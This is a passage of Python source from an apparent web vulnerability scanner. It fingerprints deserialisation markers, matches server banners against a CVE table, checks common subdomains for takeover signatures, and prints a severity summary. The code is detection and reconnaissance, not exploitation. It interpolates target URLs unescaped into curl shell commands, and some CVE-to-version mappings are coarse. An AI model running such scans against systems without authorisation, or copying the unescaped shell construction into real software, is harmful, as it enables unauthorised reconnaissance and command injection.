    rc, headers = run_cmd(f"curl -skI -m8 '{base_url}/' 2>/dev/null", timeout=12)
    headers_low = headers.lower()

    # Java serialised object magic bytes (rO0AB)
    rc2, body = run_cmd(f"curl -sk -m8 '{base_url}/' 2>/dev/null | xxd 2>/dev/null | head -5",
                        timeout=12)
    if "aced 0005" in (body or "").lower():
        issues.append("Java serialised object detected in response (magic bytes ACED0005)")

    # PHP serialise patterns
    rc3, plain_body = run_cmd(f"curl -sk -m8 '{base_url}/' 2>/dev/null | head -30", timeout=12)
    if re.search(r'(O:\d+:|a:\d+:|s:\d+:)', plain_body or ""):
        issues.append("PHP serialised object pattern found in response")

    # Check for ViewState
    if "__viewstate" in headers_low or "__viewstate" in (plain_body or "").lower():
        issues.append("ASP.NET ViewState detected — check for MAC validation bypass")

    results["deserialisation"] = issues
    if issues:
        print_finding(
            f"Deserialisation Indicators — CWE-502 ({len(issues)})",
            "\n".join(f"  [HIGH] {i}" for i in issues),
            "high"
        )
    else:
        print_status("No deserialisation indicators detected.", "miss")


# ── R: CVE Banner Matching (CWE-1035) ────────────────────────────────────────

CVE_SIGNATURES = {
    "Apache/2.4.49":  [("CVE-2021-41773","Path Traversal RCE","critical","10.0")],
    "Apache/2.4.50":  [("CVE-2021-42013","Path Traversal RCE","critical","9.8")],
    "Apache/2.2.":    [("CVE-2017-7679","Heap overflow mod_mime","high","9.8")],
    "nginx/1.14.":    [("CVE-2021-23017","Off-by-one resolver","high","7.7")],
    "nginx/1.16.":    [("CVE-2021-23017","Off-by-one resolver","high","7.7")],
    "OpenSSL/1.0.":   [("CVE-2014-0160","Heartbleed","critical","7.5"),
                       ("CVE-2016-0800","DROWN attack","high","5.9")],
    "OpenSSL/1.1.0":  [("CVE-2017-3737","Read/write after SSL_MODE_RELEASE_BUFFERS","high","7.4")],
    "PHP/5.":         [("CVE-2019-11043","RCE via FPM/FastCGI","critical","9.8")],
    "PHP/7.0.":       [("CVE-2019-11043","RCE via FPM","critical","9.8")],
    "PHP/7.1.":       [("CVE-2019-11043","RCE via FPM","critical","9.8")],
    "PHP/7.2.":       [("CVE-2019-11043","RCE via FPM","critical","9.8")],
    "PHP/7.3.":       [("CVE-2019-11043","RCE via FPM","critical","9.8")],
    "Tomcat/9.0.":    [("CVE-2020-1938","Ghostcat AJP","critical","9.8")],
    "Tomcat/8.5.":    [("CVE-2020-1938","Ghostcat AJP","critical","9.8")],
    "IIS/6.0":        [("CVE-2017-7269","Buffer overflow WebDAV","critical","9.8")],
    "IIS/7.5":        [("CVE-2010-3972","FTP auth bypass","high","9.4")],
    "WordPress/5.":   [("CVE-2022-21661","SQL injection","critical","8.8")],
    "Drupal/7.":      [("CVE-2018-7600","Drupalgeddon2 RCE","critical","9.8")],
    "Drupal/8.":      [("CVE-2019-6340","REST API RCE","critical","9.8")],
    "Jenkins":        [("CVE-2019-1003000","Script security bypass","critical","8.8")],
    "Grafana/8.":     [("CVE-2021-43798","Path traversal","critical","7.5")],
}

def _check_cve_banners(results, base_url, verbose):
    print_status("Matching service banners against CVE database…", "info")
    rc, headers = run_cmd(f"curl -skI -m8 '{base_url}/' 2>/dev/null", timeout=12)
    findings = []

    for sig, cve_list in CVE_SIGNATURES.items():
        if sig.lower() in headers.lower():
            for cve, desc, sev, score in cve_list:
                findings.append({
                    "banner":   sig,
                    "cve":      cve,
                    "desc":     desc,
                    "severity": sev,
                    "score":    score,
                    "cwe":      "CWE-1035"
                })

    results["cve_matches"] = findings
    if findings:
        print_finding(
            f"CVE Matches from Service Banners ({len(findings)})",
            "\n".join(f"  [{f['severity'].upper()}] {f['cve']} ({f['score']}) — {f['banner']}: {f['desc']}"
                      for f in findings),
            "critical" if any(f["severity"] == "critical" for f in findings) else "high"
        )
    else:
        print_status("No CVE matches from visible banners.", "miss")


# ── S: Subdomain Takeover indicators ─────────────────────────────────────────

TAKEOVER_SIGS = {
    "There isn't a GitHub Pages site here":     "GitHub Pages",
    "NoSuchBucket":                              "AWS S3",
    "The specified bucket does not exist":       "AWS S3",
    "Fastly error: unknown domain":              "Fastly CDN",
    "The feed is not found":                     "Feedpress",
    "No settings were found for this company":   "Helpjuice",
    "is not a registered InCloud YouTrack":      "YouTrack",
    "This page is reserved for artistic":        "Tumblr",
}

def _check_subdomain_takeover(results, target, verbose):
    print_status("Checking for subdomain takeover indicators…", "info")
    findings = []

    # Enumerate common subdomains
    common_subs = ["www","mail","ftp","admin","api","dev","staging","test",
                   "blog","shop","cdn","assets","static","media","support","help"]

    def check_sub(sub):
        fqdn = f"{sub}.{target}" if "." in target else None
        if not fqdn:
            return None
        try:
            socket.setdefaulttimeout(2)
            socket.gethostbyname(fqdn)
            # Subdomain resolves — check for takeover page
            rc, body = run_cmd(f"curl -sk -m5 'http://{fqdn}/' 2>/dev/null", timeout=8)
            for sig, service in TAKEOVER_SIGS.items():
                if sig.lower() in body.lower():
                    return {"subdomain": fqdn, "service": service, "sig": sig[:60]}
        except socket.gaierror:
            pass
        return None

    # Only scan if target looks like a domain
    if "." in target and not target.replace(".","").isdigit():
        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = [ex.submit(check_sub, s) for s in common_subs]
            for fut in as_completed(futures):
                r = fut.result()
                if r:
                    findings.append(r)

    results["subdomain_takeover"] = findings
    if findings:
        print_finding(
            f"Subdomain Takeover Indicators ({len(findings)})",
            "\n".join(f"  [HIGH] {f['subdomain']} — {f['service']}" for f in findings),
            "high"
        )
    else:
        print_status("No subdomain takeover indicators found.", "miss")


# ── Summary ───────────────────────────────────────────────────────────────────

def _print_cwe_table():
    print_section("OWASP CWE Top 25 (2024) Reference")
    rows = [(cwe, str(rank), name) for cwe, rank, name in CWE_TOP25]
    print_table(["CWE", "Rank", "Name"], rows)


def _print_vuln_summary(results):
    critical_keys = ["sqli","path_traversal","ssrf","xxe","ssti",
                     "file_upload","default_creds","cve_matches"]
    high_keys     = ["xss","idor","deserialisation","subdomain_takeover"]
    medium_keys   = ["open_redirect","csrf","clickjacking","rate_limiting",
                     "graphql","api_exposure","http_smuggling"]

    critical = sum(len(results.get(k,[])) for k in critical_keys)
    high     = sum(len(results.get(k,[])) for k in high_keys)
    medium   = sum(len(results.get(k,[])) for k in medium_keys)
    total    = critical + high + medium

    print(f"\n  {'─'*60}")
    print(f"  {C.BOLD}VULNERABILITY SCAN SUMMARY{C.RESET}")
    print(f"  {'─'*60}")
    print(f"  {C.RED+C.BOLD}CRITICAL : {critical}{C.RESET}")
    print(f"  {C.RED}HIGH     : {high}{C.RESET}")
    print(f"  {C.YELLOW}MEDIUM   : {medium}{C.RESET}")
    print(f"  TOTAL    : {total}")
    print(f"  {'─'*60}\n")
    if total == 0:
        print_status("No vulnerabilities detected with automated probes.", "info")
        print_status("Note: Manual testing is always recommended for full coverage.", "info")
